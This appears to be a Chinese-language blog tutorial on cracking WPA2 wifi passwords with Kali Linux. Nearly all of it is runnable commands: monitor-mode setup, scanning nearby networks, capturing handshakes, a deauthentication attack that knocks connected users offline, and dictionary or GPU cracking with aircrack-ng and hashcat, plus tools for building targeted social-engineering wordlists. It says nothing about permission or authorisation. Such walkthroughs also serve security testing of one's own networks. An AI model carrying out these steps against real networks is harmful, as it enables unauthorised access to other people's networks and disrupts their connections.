---
title: kali下破解wifi密码
date: 2019-03-07 13:36:04
tags: 
    - kali
    - wifi
categories:
    - 实践运用
    - kali
---

## 环境准备
1. kali linux
2. 支持监控模式的网卡，免安装的最好
3. 字典文件(kali自带字典放在/user/share/wordlists/rockyou.txt.gz)

## 排查影响环境
1. 断开所有网络功能
```bash
service network-manager stop
```
2. 关闭airmon
```bash
airmon-ng check kill
```
<!--more-->

##  开启网卡监控模式
```bash
iwconfig ##查看本地网卡状态
airmon-ng start wlan0
```

## 开始监听周边wifi
```bash
airodump-ng wlan0mon
```
>上面列出了周围的wifi和它们的详细信息，包括信号强度、加密类型、信道CH等。要记住要破解wifi的频道号和BSSID。按Ctrl-C结束

## 抓取wifi握手包
```bash
airodump-ng wlan0mon --bssid <lymac> -c 5<信道CH> -w wpa2
```
>__参数解释__：
    * -c指定频道号
    * –bssid指定路由器bssid
    * -w指定抓取的数据包保存位置及保存名字

## 攻击连接用户重连
有一个叫aireplay-ng的工具，它可以强制用户断开wifi连接；原理是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi,新开一个bash输入以下命令，在出现__wpa handshake__表示抓取握手包成功！
```bash
aireplay-ng -0 2 -a <lymac> -c <yhmac> wlan0mon
```
>__参数解释__：
    * -0表示发起deauthentication攻击
    * -a指定无线路由器BSSID
    * -c指定强制断开的设备

## 关闭监控模式
```bash
airmon-ng stop wlan0mon
```

## 开始破解密码
```bash
aircrack-ng -a2 -b <target_mac> -w /usr/share/wordlists/rockyou.txt ~/*.cap
或者简写
aircrack-ng *.cap -w <zd.txt>
```
>__参数解释__：
    * -a2代表WPA的握手包
    * -b指定要破解的wifi BSSID
    * -w指定字典文件

## 补充
1. 如果有GPU设备请用hashcat
```bash
aircrack-ng file.cap -J out.hccap #在破解cap文件之前，要把它转换为hccap文件
hashcat -m 2500 out.hccap 字典文件 #使用GPU破解hash
```
2. 如果前期搜集了信息，可以针对性生成社工字典，详情了解如下内容:
- [Crunch](https://bbkali.github.io/2019/03/07/%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8%E7%A5%9E%E5%99%A8Crunch/)
- [cupp](https://github.com/Saferman/cupper.git)
- Cewl

